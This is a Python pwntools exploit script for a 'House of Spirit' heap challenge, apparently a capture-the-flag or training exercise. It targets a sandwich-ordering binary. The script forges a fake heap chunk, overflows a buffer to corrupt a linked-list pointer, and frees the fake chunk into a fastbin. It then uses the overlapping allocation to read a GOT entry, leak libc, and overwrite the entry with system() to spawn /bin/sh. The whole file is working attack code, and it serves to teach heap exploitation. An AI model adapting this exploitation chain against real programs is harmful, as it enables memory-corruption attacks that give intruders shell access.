'''
House of Spirit Challenge
''' 
from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'challenge'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 

# Send the name of the resturant
def set_resturant(name, intro=False):
	if(intro == False): 
		p.sendlineafter(">", "5")

	p.sendlineafter("name", name)

# Add a sandwich (order)
def add(butter, jelly): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("Type: ", butter) # Input for butter
	p.sendlineafter("Type: ", jelly)  # Input for jelly
	return 

# Remove the sandwich (eat)
def remove(index):
	p.sendlineafter(">", "2") 
	p.sendlineafter("remove:", str(index))
	return 

# Edit the most recent order
def edit(butter, jelly):
	p.sendlineafter(">", "4") 
	p.sendlineafter("Type: ", butter) # Input for butter 
	p.sendlineafter("Type: ", jelly) # Input for jelly 
	return 

def print_wich(index): 
	p.sendlineafter(">", "3") 
	p.sendlineafter("view:", str(index))
	p.recvuntil("made a ") 
	butter = p.recvuntil(" butter").replace(" butter", "")
	p.recvuntil("and ")  
	jelly = p.recvuntil(" jelly").replace(" jelly", "") 
	return butter, jelly 

# Performs the house of spirit
def house_of_spirit():

	#######################
	# Create a fake chunk #
	#######################
	# The sizes of all the orders are of 0x40
	chunk_size = 0x40 

	# Filler for the prev_size 
	fake_chunk = p64(0x0) 	# Offset 0x0
	
	# The fake chunk size
	fake_chunk += p64(chunk_size) # Offset 0x8

	# Filler prior to the next chunk at offset 0x40
	fake_chunk += "B" * 0x30

	# prev_size of the next chunk
	fake_chunk += p64(0x0) 

	# Next Chunk size (needs to be greater than 0x20 and less than system_mem)
	fake_chunk += p64(0x20) # Next Chunk size 

	# Use the resturant name as a fake chunk for later
	set_resturant(fake_chunk, intro = True)


	#########################
	# Exploit Buffer Overflow
	#########################
	'''
	The structure (after the butter variable) has a pointer to 
	the 'next' ptr. Because the butter variable has a buffer 
	overflow, we can OVERWRITE this with an arbitrary value.

	We will set the 'next' pointer to the fake_chunk 
	(from the previous step) that we made.
	'''

	# Filler prior to overflow
	butter = "A" * 40 
	
	# Location of the 'resturant_name' variable, which holds our fake chunk.
	# We add 0x10 because the pointer (that the user is given) is mem + 0x10.
	butter += p64(elf.symbols['resturant_name'] + 0x10) 

	# Exploit the buffer overflow to overflow 'next' ptr.
	add("B" * 8, butter)

	
	###################
	# House of Spirit #
	################### 
	
	# Puts the 'fake chunk' (resturant_name variable) into the 0x40 fastbin
	remove(1)

def arbitrary_read_or_write():
	
	''' 
	The 0x40 fastbin has a single chunk inside of it, 
	which is the resturant_name variable fake_chunk 

	If we create a NEW order, the chunk will be allocated to us. 

	Because we control the 'resturant_name' variable, we 
	will be able to create an arbitrary write or read primative 
	by overriding the sandwich->jelly_ptr variable.
	'''

	#####################
	# Overlapping Chunk #
	#####################

	# Get the overlapping chunk
	add("C" * 8, "D" * 8) 


	##########################
	# Leak via Ptr Overwrite #		
	##########################
	
	# Overwrite the 'jelly_ptr' in order to create an arbitrary read/write 
	# The place to overwrite this with is very particular...
	
	set_resturant("A" * 0x10 + p64(elf.got['strchr']) + "B" * 0x8)
	_, jelly = print_wich(1)

	# LibC Leak 
	libc_leak = u64(jelly + "\x00\x00") 
	libc_base = libc_leak - 0x89ab0
	print hex(libc_base) 

	pause()
	edit(p64(libc_base + 0x45390) + p64(libc_base + 0x55800), "/bin/sh")
	
''' 
Plan: 

- Overwrite next pointer to point to the resturant (with a fake chunk) 
- House of spirit (free the chunk that we just corrupted) 
- Edit resturant to change jelly_ptr to PLT/GOT entry 
	- Use this to read (leak LibC) 
	- Use this to write (system) 
- Win :)
'''

house_of_spirit()
arbitrary_read_or_write()
p.interactive()


